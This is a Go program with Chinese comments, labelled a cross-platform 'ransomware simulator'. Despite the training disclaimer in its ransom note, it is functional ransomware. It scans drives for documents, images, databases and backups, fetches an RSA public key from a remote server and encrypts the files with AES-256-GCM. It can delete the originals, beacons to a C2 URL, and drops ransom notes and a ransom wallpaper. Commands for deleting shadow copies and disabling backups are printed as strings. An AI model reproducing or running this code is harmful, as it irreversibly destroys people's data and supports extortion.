package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"flag"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// --- 勒索软件特征常量 ---
const VERSION = "v2.0-RansomSimulator-CrossPlatform"
const API_URL = "https://rsa-uuid.api.yangzifun.org"
const BEACON_URL = "http://bad-c2-server.api.yangzifun.org/beacon_check_in"

// --- 勒索信内容 ---
const RANSOM_NOTE_CONTENT = `
========================= [ 你的所有文件都已被锁定! ] =========================

不要惊慌！这是一个受控的模拟演练。但如果这是一次真实的攻击，
你的网络已经被完全攻陷。

你的重要文件 - 文档、照片、数据库、备份 - 都已被强大的军用级加密算法
AES-256 + RSA-2048 加密。
没有任何后门或捷径。恢复它们的唯一方法是从我们这里购买唯一的解密密钥。

任何自行恢复文件的尝试都将导致它们的永久性损坏。
禁用或重启此设备也可能导致永久性的数据丢失。

要开始恢复流程，你需要联系我们并提供你的专属ID。

你的专属ID是: %s

====================== [ 这是一次用于安全培训的模拟 ] ======================
`

var (
	lockFilePath       string
	ransomNoteFileName = "!!!_如何解密你的文件_!!!.txt"
	excludedDirs       = []string{
		"/bin", "/boot", "/dev", "/etc", "/lib", "/lib64", "/proc", "/run", "/sbin", "/sys", "/usr", "/var",
		"/tmp", "/lost+found", "/Applications", "/Library", "/System", "/private",
		"$Recycle.Bin", "$RECYCLE.BIN", "System Volume Information",
	}
	targetExtensions = []string{
		".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".csv", ".txt", ".rtf",
		".zip", ".rar", ".7z", ".tar", ".gz",
		".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tif", ".svg",
		".sql", ".db", ".mdb", ".accdb", ".sqlite",
		".bak", ".backup",
	}
)

type APIResponse struct {
	PublicKeyPEM string `json:"public_key_pem"`
	UUID         string `json:"uuid"`
	Status       string `json:"status"`
	Message      string `json:"message"`
}

type fileLog struct {
	mu   sync.Mutex
	file *os.File
}

type counters struct {
	success atomic.Uint64
	failed  atomic.Uint64
}

// --- 主逻辑 ---
func main() {
	fmt.Println("==================================================")
	fmt.Println("      勒索软件模拟器 - 攻击已启动")
	fmt.Printf("                版本: %s\n", VERSION)
	fmt.Println("==================================================")
	time.Sleep(1 * time.Second)

	fmt.Println("\n[阶段 1: 渗透与持久化]")

	fmt.Print("[*] 通过互斥锁建立持久化... ")
	if !createSingleInstanceLock() {
		fmt.Println("失败. [IOC] 检测到另一个实例正在运行。程序终止。")
		os.Exit(1)
	}
	fmt.Println("成功.")
	defer cleanupLockFile()

	fs := flag.NewFlagSet("ransom_simulator", flag.ExitOnError)
	workersFlag, dryRunFlag, extensionsFlag, directoryFlag, removeFlag := setupFlags(fs)
	fs.Parse(os.Args[1:])

	showWarning(*dryRunFlag)

	fmt.Println("\n[阶段 2: 防御规避与发现]")

	if *dryRunFlag {
		fmt.Println("[*] [演习模式] 跳过所有破坏性操作。")
	} else {
		go networkBeacon()
		simulateDestructiveActions()
	}

	// 处理扩展名参数
	extFilter := make(map[string]bool)
	if *extensionsFlag != "" {
		exts := strings.Split(*extensionsFlag, ",")
		for _, ext := range exts {
			ext = strings.TrimSpace(ext)
			if ext != "" {
				if !strings.HasPrefix(ext, ".") {
					ext = "." + ext
				}
				extFilter[strings.ToLower(ext)] = true
			}
		}
		fmt.Printf("[*] 使用指定的扩展名: %v\n", getKeys(extFilter))
	} else {
		for _, ext := range targetExtensions {
			extFilter[ext] = true
		}
		fmt.Println("[*] 使用默认扩展名")
	}

	// 处理目录参数
	var scanRoots []string
	if *directoryFlag != "" {
		dirs := strings.Split(*directoryFlag, ",")
		for _, dir := range dirs {
			dir = strings.TrimSpace(dir)
			if dir != "" {
				scanRoots = append(scanRoots, dir)
			}
		}
		fmt.Printf("[*] 扫描指定目录: %v\n", scanRoots)
	}

	fmt.Println("[*] 正在扫描文件系统以查找有价值的目标...")
	filesToProcess := scanFiles(extFilter, scanRoots)
	if len(filesToProcess) == 0 {
		fmt.Println("[!] 未找到任何有价值的目标文件。任务中止。")
		os.Exit(0)
	}
	fmt.Printf("[+] 目标捕获完成。已识别 %d 个待加密文件。\n", len(filesToProcess))

	var stats counters
	var finalUUID = "C2服务器连接失败"

	if *dryRunFlag {
		fmt.Println("\n[阶段 3: 载荷部署 (演习模式下跳过)]")
		fmt.Println("[*] 以下文件在真实攻击中将被加密:")
		for _, f := range filesToProcess {
			fmt.Println("  -", f)
		}
	} else {
		fmt.Println("\n[阶段 3: 载荷部署]")
		fmt.Printf("[*] 初始化 %d 个加密线程。开始执行载荷...\n", *workersFlag)
		runEncryptionWorkers(filesToProcess, *workersFlag, &stats, &finalUUID, *removeFlag)
		fmt.Println("\n[+] 载荷执行完毕。")
	}

	if !*dryRunFlag {
		fmt.Println("\n[阶段 4: 勒索]")
		fmt.Println("[*] 正在向全系统投放勒索信...")
		dropRansomNotes(fmt.Sprintf(RANSOM_NOTE_CONTENT, finalUUID))
		fmt.Println("[+] 勒索信投放完毕。")
		createRansomWallpaper()
	}

	fmt.Println("\n================== [ 任务完成 ] ==================")
	fmt.Println("                   执行摘要:")
	if *dryRunFlag {
		fmt.Printf("  - 模式:            演习模式 (Dry Run)\n")
		fmt.Printf("  - 发现目标:        %d\n", len(filesToProcess))
	} else {
		fmt.Printf("  - 模式:            实时攻击\n")
		fmt.Printf("  - 已加密文件:      %d\n", stats.success.Load())
		fmt.Printf("  - 加密失败:        %d\n", stats.failed.Load())
		if stats.success.Load() > 0 {
			fmt.Printf("  - 结果:            系统被攻陷\n")
		} else {
			fmt.Printf("  - 结果:            任务失败\n")
		}
	}
	fmt.Println("====================================================")
	countdown("此终端将在", 10)
}

// --- 锁机制实现 (修复了 undefined 错误) ---

func createSingleInstanceLock() bool {
	var err error
	lockFilePath = filepath.Join(os.TempDir(), "ransom_simulator_instance.lock")

	// O_EXCL 确保如果文件已存在则创建失败，实现单例锁
	var file *os.File
	file, err = os.OpenFile(lockFilePath, os.O_CREATE|os.O_EXCL, 0666)
	if err != nil {
		return false
	}
	file.Close()
	return true
}

func cleanupLockFile() {
	if lockFilePath != "" {
		os.Remove(lockFilePath)
	}
}

// --- 平台无关的辅助函数 ---

func setupFlags(fs *flag.FlagSet) (*int, *bool, *string, *string, *bool) {
	workers := fs.Int("workers", runtime.NumCPU(), "可选：并发 worker 数量 (默认: CPU核心数)")
	dryRun := fs.Bool("dry-run", false, "可选：演习模式，只查找不加密")
	extensions := fs.String("ext", "", "可选：指定要加密的文件扩展名，多个用逗号分隔（如：.txt,.doc,.pdf）")
	directory := fs.String("dir", "", "可选：指定要加密的目录，多个用逗号分隔")
	removeOriginal := fs.Bool("remove", false, "可选：加密后删除原文件")

	fs.Usage = func() {
		fmt.Fprintf(os.Stderr, "用法: %s [-workers N] [-dry-run] [-ext extensions] [-dir directories] [-remove]\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "示例:\n")
		fmt.Fprintf(os.Stderr, "  %s -ext .txt,.doc -dir C:\\Users\\Test,D:\\Data -remove\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "  %s -dry-run -ext .pdf\n", os.Args[0])
		fs.PrintDefaults()
	}
	return workers, dryRun, extensions, directory, removeOriginal
}

func showWarning(dryRun bool) {
	fmt.Fprintf(os.Stderr, "\n************************** 警告 **************************\n")
	fmt.Fprintf(os.Stderr, "此程序将自动扫描并加密系统中的所有关键数据文件。\n")
	fmt.Fprintf(os.Stderr, "这是一个高度危险的模拟，请确保在隔离的环境中运行！\n")
	fmt.Fprintf(os.Stderr, "**********************************************************\n\n")
	if dryRun {
		fmt.Println(">>> 已激活 [演习模式 (Dry Run)]，不会执行任何加密操作。")
	} else {
		fmt.Println(">>> 警告: 实时攻击模式已激活！将在 3 秒后自动开始...")
		time.Sleep(3 * time.Second)
	}
}

func countdown(message string, seconds int) {
	fmt.Println()
	for i := seconds; i >= 0; i-- {
		fmt.Printf("\r%s %d 秒后自动退出...", message, i)
		time.Sleep(1 * time.Second)
	}
	fmt.Println("\r程序已退出。                                  ")
}

func networkBeacon() {
	time.Sleep(3 * time.Second)
	fmt.Println("[IOC] C2信标: 正在尝试连接 C2 服务器...")
	client := http.Client{Timeout: 5 * time.Second}
	_, err := client.Get(BEACON_URL)
	if err == nil {
		fmt.Printf("[IOC] C2信标: 成功连接到 %s。\n", BEACON_URL)
	}
}

func simulateDestructiveActions() {
	time.Sleep(1 * time.Second)
	fmt.Println("[*] 启动防御规避协议...")
	switch runtime.GOOS {
	case "windows":
		fmt.Println("  - [IOC] 模拟: 执行命令 'vssadmin.exe delete shadows /all /quiet'")
	case "darwin":
		fmt.Println("  - [IOC] 模拟: 执行命令 'tmutil disable'")
	case "linux":
		fmt.Println("  - [IOC] 模拟: 执行命令 'rm -rf /home/*/.{cache,config}/backups'")
	}
	fmt.Println("  - [IOC] 模拟: 清除系统安全日志...")
	time.Sleep(1 * time.Second)
}

func dropRansomNotes(content string) {
	dirs := getUserDirs()
	desktopPath := getDesktopPath()
	if desktopPath != "" {
		found := false
		for _, d := range dirs {
			if d == desktopPath {
				found = true
				break
			}
		}
		if !found {
			dirs = append(dirs, desktopPath)
		}
	}
	for _, dir := range dirs {
		if _, err := os.Stat(dir); err == nil {
			notePath := filepath.Join(dir, ransomNoteFileName)
			os.WriteFile(notePath, []byte(content), 0644)
		}
	}
}

func createRansomWallpaper() {
	desktopPath := getDesktopPath()
	if desktopPath == "" {
		fmt.Println("[!] 未能定位用于创建壁纸的桌面路径。")
		return
	}
	imgPath := filepath.Join(desktopPath, "RANSOM_WALLPAPER.png")
	if err := os.MkdirAll(desktopPath, 0755); err != nil {
		fmt.Printf("[!] 创建桌面壁纸目录失败: %v\n", err)
		return
	}
	img := image.NewRGBA(image.Rect(0, 0, 800, 600))
	bgColor := color.RGBA{0, 0, 0, 255} // Black background
	for x := 0; x < 800; x++ {
		for y := 0; y < 600; y++ {
			img.Set(x, y, bgColor)
		}
	}
	file, err := os.Create(imgPath)
	if err != nil {
		fmt.Printf("[!] 创建壁纸图片失败: %v\n", err)
		return
	}
	defer file.Close()
	png.Encode(file, img)
	fmt.Printf("[+] 勒索壁纸已创建于: %s\n", imgPath)
	fmt.Println("[IOC] 模拟更改桌面背景...")
	var cmd string
	switch runtime.GOOS {
	case "windows":
		cmd = fmt.Sprintf(`reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%s" /f`, imgPath)
	case "darwin":
		cmd = fmt.Sprintf(`osascript -e 'tell application "Finder" to set desktop picture to POSIX file "%s"'`, imgPath)
	case "linux":
		cmd = fmt.Sprintf(`gsettings set org.gnome.desktop.background picture-uri file://%s`, imgPath)
	default:
		return
	}
	fmt.Printf("  - 模拟: 执行命令 (并未实际运行): %s\n", cmd)
}

func scanFiles(extFilter map[string]bool, scanRoots []string) []string {
	var filesToProcess []string
	var roots []string

	if len(scanRoots) > 0 {
		roots = scanRoots
	} else {
		roots = []string{"/"}
		if runtime.GOOS == "windows" {
			roots = []string{}
			for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
				drivePath := string(drive) + ":\\"
				if _, err := os.Stat(drivePath); err == nil {
					roots = append(roots, drivePath)
				}
			}
		}
	}

	for _, root := range roots {
		filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}
			if info.IsDir() {
				if isExcluded(path) {
					return filepath.SkipDir
				}
			} else {
				if shouldEncrypt(path, extFilter) {
					filesToProcess = append(filesToProcess, path)
				}
			}
			return nil
		})
	}
	return filesToProcess
}

func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUUID *string, removeOriginal bool) {
	jobs := make(chan string, len(files))
	var wg sync.WaitGroup

	log, err := newFileLog("ransom_log.txt")
	if err != nil {
		fmt.Fprintf(os.Stderr, "警告: 无法创建日志文件 'ransom_log.txt': %v\n", err)
	} else {
		defer log.Close()
	}

	resp, err := fetchKeysFromAPI()
	if err != nil {
		fmt.Printf("\n[致命错误] 无法从 C2 服务器 '%s' 获取加密密钥: %v。所有线程将失败。任务中止。\n", API_URL, err)
		stats.failed.Add(uint64(len(files)))
		return
	}

	*outUUID = resp.UUID

	if log != nil {
		log.Log(fmt.Sprintf("[主控] UUID: %s\n[主控] PublicKeyPEM: %s\n", resp.UUID, resp.PublicKeyPEM))
	}

	for w := 0; w < numWorkers; w++ {
		wg.Add(1)
		go worker(w+1, jobs, &wg, stats, log, resp, removeOriginal)
	}

	for _, file := range files {
		jobs <- file
	}
	close(jobs)

	done := make(chan bool)
	go func() {
		totalFiles := uint64(len(files))
		ticker := time.NewTicker(200 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-done:
				return
			case <-ticker.C:
				processed := stats.success.Load() + stats.failed.Load()
				if totalFiles > 0 {
					progress := float64(processed) / float64(totalFiles) * 100
					fmt.Printf("\r[*] 正在加密... [%.2f%%] (%d/%d)", progress, processed, totalFiles)
				}
			}
		}
	}()

	wg.Wait()
	close(done)
	totalFiles := uint64(len(files))
	fmt.Printf("\r[*] 加密完成。 [100.00%%] (%d/%d) \n", totalFiles, totalFiles)
}

func worker(id int, jobs <-chan string, wg *sync.WaitGroup, stats *counters, log *fileLog, apiResp *APIResponse, removeOriginal bool) {
	defer wg.Done()
	for file := range jobs {
		err := processFile(file, apiResp.PublicKeyPEM, removeOriginal)
		if err != nil {
			stats.failed.Add(1)
		} else {
			stats.success.Add(1)
		}
	}
}

func fetchKeysFromAPI() (*APIResponse, error) {
	client := &http.Client{Timeout: 10 * time.Second}
	req, err := http.NewRequest("POST", API_URL, nil)
	if err != nil {
		return nil, fmt.Errorf("创建请求失败: %w", err)
	}
	req.Header.Set("User-Agent", "Ransom-Simulator/"+VERSION)
	req.Header.Set("Content-Type", "application/json")

	res, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("执行 API 请求失败: %w", err)
	}
	defer res.Body.Close()

	if res.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("API 请求返回状态码 %s", res.Status)
	}

	body, err := io.ReadAll(res.Body)
	if err != nil {
		return nil, fmt.Errorf("读取API响应体失败: %w", err)
	}

	var apiResp APIResponse
	if err := json.Unmarshal(body, &apiResp); err != nil {
		return nil, fmt.Errorf("解析 API 响应失败: %w", err)
	}

	if apiResp.Status != "success" || apiResp.PublicKeyPEM == "" || apiResp.UUID == "" {
		errMsg := apiResp.Message
		if errMsg == "" {
			errMsg = string(body)
		}
		return nil, fmt.Errorf("无效的 API 响应数据: %s", errMsg)
	}
	return &apiResp, nil
}

func isExcluded(path string) bool {
	if runtime.GOOS == "windows" {
		winExclude := []string{"C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)"}
		for _, ex := range winExclude {
			if strings.EqualFold(path, ex) || strings.HasPrefix(strings.ToLower(path), strings.ToLower(ex)+"\\") {
				return true
			}
		}
	}
	for _, dir := range excludedDirs {
		if strings.HasPrefix(path, dir+string(filepath.Separator)) || path == dir {
			return true
		}
	}
	return false
}

func shouldEncrypt(filePath string, extFilter map[string]bool) bool {
	return extFilter[strings.ToLower(filepath.Ext(filePath))]
}

func getUserDirs() []string {
	home, _ := os.UserHomeDir()
	if home == "" {
		return []string{}
	}
	return []string{home}
}

func getKeys(m map[string]bool) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}

func getDesktopPath() string {
	home, err := os.UserHomeDir()
	if err != nil {
		return ""
	}
	switch runtime.GOOS {
	case "windows", "darwin":
		return filepath.Join(home, "Desktop")
	case "linux":
		if xdg := os.Getenv("XDG_DESKTOP_DIR"); xdg != "" {
			return xdg
		}
		return filepath.Join(home, "Desktop")
	default:
		return home
	}
}

func processFile(filePath string, publicKeyStr string, removeOriginal bool) error {
	content, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	encryptedContent, err := hybridEncrypt(content, publicKeyStr)
	if err != nil {
		return err
	}

	encryptedFilePath := filePath + ".encrypted"

	err = os.WriteFile(encryptedFilePath, encryptedContent, 0644)
	if err != nil {
		return err
	}

	if removeOriginal {
		err = os.Remove(filePath)
		if err != nil {
			fmt.Printf("[!] 无法删除原文件 %s: %v\n", filePath, err)
		} else {
			fmt.Printf("[*] 文件已加密，原文件已删除: %s -> %s\n", filePath, encryptedFilePath)
		}
	} else {
		fmt.Printf("[*] 文件已加密，保留原文件: %s -> %s\n", filePath, encryptedFilePath)
	}

	return nil
}

func hybridEncrypt(plaintext []byte, publicKeyStr string) ([]byte, error) {
	aesKey := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, aesKey); err != nil {
		return nil, err
	}
	block, _ := aes.NewCipher(aesKey)
	aesGCM, _ := cipher.NewGCM(block)
	nonce := make([]byte, aesGCM.NonceSize())
	io.ReadFull(rand.Reader, nonce)
	ciphertext := aesGCM.Seal(nonce, nonce, plaintext, nil)
	pemBlock, _ := pem.Decode([]byte(publicKeyStr))
	if pemBlock == nil {
		return nil, fmt.Errorf("无法解码PEM块")
	}
	pub, err := x509.ParsePKIXPublicKey(pemBlock.Bytes)
	if err != nil {
		return nil, err
	}
	rsaPubKey, ok := pub.(*rsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("公钥类型断言失败")
	}
	encryptedAESKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, rsaPubKey, aesKey, nil)
	if err != nil {
		return nil, err
	}
	var buffer bytes.Buffer
	buffer.Write(encryptedAESKey)
	buffer.Write(ciphertext)
	return buffer.Bytes(), nil
}

func newFileLog(filename string) (*fileLog, error) {
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return nil, err
	}
	return &fileLog{file: f}, nil
}

func (l *fileLog) Log(message string) {
	l.mu.Lock()
	defer l.mu.Unlock()
	if l.file != nil {
		l.file.WriteString(time.Now().Format("2006-01-02 15:04:05") + " - " + message + "\n")
	}
}

func (l *fileLog) Close() {
	if l.file != nil {
		l.file.Close()
	}
}
